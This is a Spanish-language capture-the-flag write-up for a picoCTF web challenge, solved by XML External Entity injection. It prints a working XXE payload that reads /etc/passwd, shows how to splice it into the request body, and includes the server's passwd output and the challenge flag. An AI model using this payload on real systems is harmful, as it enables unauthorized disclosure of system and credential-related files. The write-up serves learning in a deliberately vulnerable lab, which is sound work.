## Descripción  
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

Additional details will be available after launching your challenge instance.

## Datos de Acceso al Nivel
user: carlosof / kali 
password:

## Solución
- Ingresamos a la página web e inspeccionamos la pagina.
- Ingresamos al apartado de red y presionamos uno de los 3 botones de `deatils` que aparecen, no tiene importancia cual sea.
- Ahí podemos ver la petición y damos dos clics para ver los encabezados, le damos reenviar al  formulario para ver las solicitudes y podemos ver la petición carga útil  XML.
- Si ingresamos a la página https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity podernos ver que podemos hacer una inyección con el siguiente ejemplo:
```bash
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
- Copiamos la segunda línea y la pegamos en el cuerpo de tal manera que quede así:
```bash
--Antes
<?xml version="1.0" encoding="UTF-8"?><data><ID>1</ID></data>
--Despues
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]><data><ID>1</ID></data>
```
- Dentro de las etiquetas de ID, colocamos la 3er línea, de tal manera que quede de esta manera:
```bash
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]><data><ID>&example;</ID></data>
```
- Enviamos esta solicitud, entramos al apartado de respuesta y obtenemos un mensaje, junto con la bandera.
```bash
Invalid ID: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin flask:x:999:999::/app:/bin/sh picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_e5f02dbf}
```

## Notas Adicionales
La inyección XML es una técnica de ataque en la que un atacante manipula datos XML en una aplicación para explotar vulnerabilidades en el procesamiento de XML. Este tipo de inyección es similar a otras inyecciones, como la inyección SQL, pero se centra en la forma en que se manejan los datos XML.

**¿Cómo funciona?

1. **Vulnerabilidad**: Ocurre cuando una aplicación acepta datos XML de una fuente no confiable y los procesa sin validación adecuada. Esto puede incluir la falta de control sobre los datos que se introducen en el XML o en la forma en que se utilizan.
    
2. **Manipulación de Datos**: El atacante envía un documento XML malicioso que puede incluir:
    
    - **Entidades externas**: Estas permiten la inclusión de archivos locales o remotos, lo que puede llevar a la divulgación de información sensible.
    - **Modificación de datos**: Alterar la estructura del XML para alterar la lógica de negocio de la aplicación.
3. **Ejecución**: Si la aplicación no sanitiza correctamente el XML, puede ejecutar comandos no deseados o exponer datos que no deberían estar accesibles.

## Referencias 
https://play.picoctf.org/practice/challenge/376?page=1&search=soap
https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity